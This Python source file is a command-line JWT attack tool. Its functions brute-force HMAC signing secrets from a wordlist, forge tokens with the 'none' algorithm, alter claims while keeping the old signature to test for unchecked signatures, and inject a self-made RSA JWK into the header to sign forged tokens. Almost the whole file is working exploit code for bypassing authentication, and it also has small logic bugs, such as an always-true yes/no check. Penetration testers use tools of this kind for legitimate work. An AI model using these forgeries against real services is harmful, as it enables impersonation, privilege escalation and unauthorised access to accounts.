import base64
import json
import hmac 
import hashlib
import sys
import argparse
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def int_to_base64url(n):
    """Converts an integer to a base64-url encoded string."""
    return base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')



def jwt_decode(token):
    try:
        token_parts = token.split(".")
        if len(token_parts) != 3:
            raise ValueError("Invalid JWT token format")

        decoded_header = base64.urlsafe_b64decode(token_parts[0] + "==").decode('utf-8')
        decoded_payload = base64.urlsafe_b64decode(token_parts[1] + "==").decode('utf-8')
        signature = token_parts[2]  # Signature is binary data, so no need to decode

        print("Decoded Header: ", decoded_header)
        print("Decoded Payload: ", decoded_payload)

        return decoded_header, decoded_payload, signature

    except UnicodeDecodeError as e:
        print(f"Error decoding JWT part: {e}")
        return None, None, None
    except Exception as e:
        print(f"Error: {e}")
        return None, None, None

def b64_encode(content):
    out=base64.urlsafe_b64encode(json.dumps(content).encode()).rstrip(b'=').decode('utf-8')
    return out

def jwt_secret_bruteforce(file_path, token):
    try:
        header_b64, payload_b64, signature_b64 = token.split(".")
        
        header_decoded = base64.urlsafe_b64decode(header_b64 + "==").decode('utf-8')
        payload_decoded = base64.urlsafe_b64decode(payload_b64 + "==").decode('utf-8')
        
        print("Decoded Header: ", header_decoded)
        print("Decoded Payload: ", payload_decoded)
        
        # Prepare the data to be signed (header and payload)
        unsigned_token = f'{header_b64}.{payload_b64}'

        with open(file_path, "r") as candidate_keys:
            for key in candidate_keys:
                key = key.strip()

                # Generate the HMAC SHA256 signature using the candidate key
                new_signature = hmac.new(key.encode(), unsigned_token.encode(), hashlib.sha256).digest()
                
                # Base64 URL encode the generated signature
                new_signature_encoded = base64.urlsafe_b64encode(new_signature).rstrip(b'=').decode('utf-8')

                # Compare the generated signature with the JWT's signature
                if new_signature_encoded == signature_b64:
                    print(f"Secret Found: {key}")
                    return key
            print("Brute force failed: No matching secret found.")
    except Exception as e:
        print(f"An error occurred: {e}")


def alg_none(token):
    header, payload, signature = jwt_decode(token)

    if header and payload and signature:
        try:
            # Parse the header as JSON
            header_json = json.loads(header)

            # Change the 'alg' field to 'none'
            header_json['alg'] = 'none'

            # Re-encode the header to base64
            new_header_b64 = base64.urlsafe_b64encode(json.dumps(header_json).encode()).rstrip(b'=').decode('utf-8')

            # Create a new token with the modified header, the original payload, and no signature
            new_token = f'{new_header_b64}.{token.split(".")[1]}.'

            print("Modified JWT with 'none' alg: ", new_token)
            if input("Want to edit token values? (y/n)") == 'y' or 'Y':
                edit_param(new_token)
            else:
                pass
                
            return new_token

        except json.JSONDecodeError as e:
            print(f"Error decoding JWT header as JSON: {e}")
            return None

def add_param(jwt_section, json_data):
    try:
        print(f"Current {jwt_section}: {json_data}")
        jwt_parameter = input(f"Enter the new parameter name to add in {jwt_section}: ")
        param_value = input(f"Enter the value for {jwt_parameter}: ")
        json_data[jwt_parameter] = param_value
        return json_data

    except Exception as e:
        print(f"Error adding parameter: {e}")
        return json_data

def edit_param(token):
    header, payload, signature = jwt_decode(token)
    if header and payload:
        try:
            header_json = json.loads(header)
            payload_json = json.loads(payload)
            while True:
                jwt_section = input("Section of token you want to edit (header/payload): ")

                if jwt_section == "header":
                    choice = input("Do you want to edit or add a parameter? (edit/add): ").strip().lower()
                    if choice == "edit":
                        print(header_json)
                        jwt_parameter = input("Select parameter you want to edit: ")
                        param_value = input("Enter the value: ")
                        header_json[jwt_parameter] = param_value
                    elif choice == "add":
                        header_json = add_param(jwt_section, header_json)

                    final_token = f'{b64_encode(header_json)}.{b64_encode(payload_json)}'
                    print(f"Updated JWT: {final_token}")

                elif jwt_section == "payload":
                    choice = input("Do you want to edit or add a parameter? (edit/add): ").strip().lower()
                    if choice == "edit":
                        print(payload_json)
                        jwt_parameter = input("Select parameter you want to edit: ")
                        param_value = input("Enter the value: ")
                        payload_json[jwt_parameter] = param_value
                    elif choice == "add":
                        payload_json = add_param(jwt_section, payload_json)

                    final_token = f'{b64_encode(header_json)}.{b64_encode(payload_json)}'
                    print(f"Updated JWT: {final_token}")

                else:
                    print("Invalid input")
                    continue

                flag = input("Edit more? (yes/no): ").strip().lower()
                if flag != "yes" and flag != 'y':
                    break

        except json.JSONDecodeError as e:
            print(f"Error decoding JWT header as JSON: {e}")
            return None

        return final_token, signature 
    
def unverified_sign(token):
    new_token, signature=edit_param(token)
    final_token=f'{new_token}.{signature}'
    print(final_token)

def generate_rsa_jwk(token):
    # Generate RSA key pair
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    # Get the public key in numbers format
    public_numbers = private_key.public_key().public_numbers()

    header,_,_= jwt_decode(token)
    if header:
        try:
            header_json = json.loads(header)
            kid=header_json["kid"]
        except json.JSONDecodeError as e:
            print(e)
    # Build JWK
    jwk = {
        "kty": "RSA",
        "kid": kid,  # You can replace this with any unique key ID
        "use": "sig",        # Indicates the key is for signature
        "n": int_to_base64url(public_numbers.n),  # Modulus
        "e": int_to_base64url(public_numbers.e)   # Exponent (ensure e is valid)
    }

    return jwk, private_key


def sign_with_jwk(token):
    jwk, private_key = generate_rsa_jwk(token)
    print("Generated JWK: ", json.dumps(jwk, indent=4))

    header, payload, _ = jwt_decode(token)
    if header and payload:
        try:
            # Modify header to include jwk parameter
            header_json = json.loads(header)
            header_json['jwk'] = jwk

            # Re-encode header and payload
            new_header_b64 = b64_encode(header_json)
            new_payload_b64 = b64_encode(json.loads(payload))

            # Create unsigned token
            unsigned_token = f'{new_header_b64}.{new_payload_b64}'

            # Sign using private RSA key
            signature = private_key.sign(
                unsigned_token.encode('utf-8'),
                padding.PKCS1v15(),
                hashes.SHA256()
            )

            # Base64 URL encode signature
            new_signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode('utf-8')

            # Create final JWT
            final_token = f'{unsigned_token}.{new_signature_b64}'
            print("JWT with custom JWK header: ", final_token)

            return final_token

        except Exception as e:
            print(f"Error: {e}")
            return None



def main():

    parser = argparse.ArgumentParser(description="JWT secret brute-forcing tool.")
    
    parser.add_argument("-f", "--file", type=str, required=False, help="Path to the wordlist.")
    parser.add_argument("-t", "--token", type=str, required=True, help="JSON Web Token (JWT) to brute-force.")
    parser.add_argument("-d","--decode", action="store_true", help="Decode JWT.")
    parser.add_argument("-bf","--bruteforce", action="store_true", help="BruteForce JWT Secret.")
    parser.add_argument("-n","--none", action="store_true", help="None alg scan.")
    parser.add_argument("-e", "--edit", action="store_true", help="Edit paraemter values.")
    parser.add_argument("-us", "--unverified", action="store_true", help="Generate token with alterred values with same sigature to test unverified signature bypass")
    parser.add_argument("-jwk", "--jwk", action="store_true", help="Generate JWK and sign JWT with the generated key.")

    args = parser.parse_args()
    file_path = args.file
    token = args.token

    if args.decode:
        jwt_decode(token)
    elif args.bruteforce:
        jwt_secret_bruteforce(file_path, token)
    elif args.none:
        alg_none(token)
    elif args.edit:
        edit_param(token)
    elif args.unverified:
        unverified_sign(token)
    elif args.jwk:
        sign_with_jwk(token)

    return file_path, token

if __name__ == "__main__":
    file_path, token = main()
    print(f"Wordlist File Path: {file_path}")
    print(f"JWT Token: {token}")
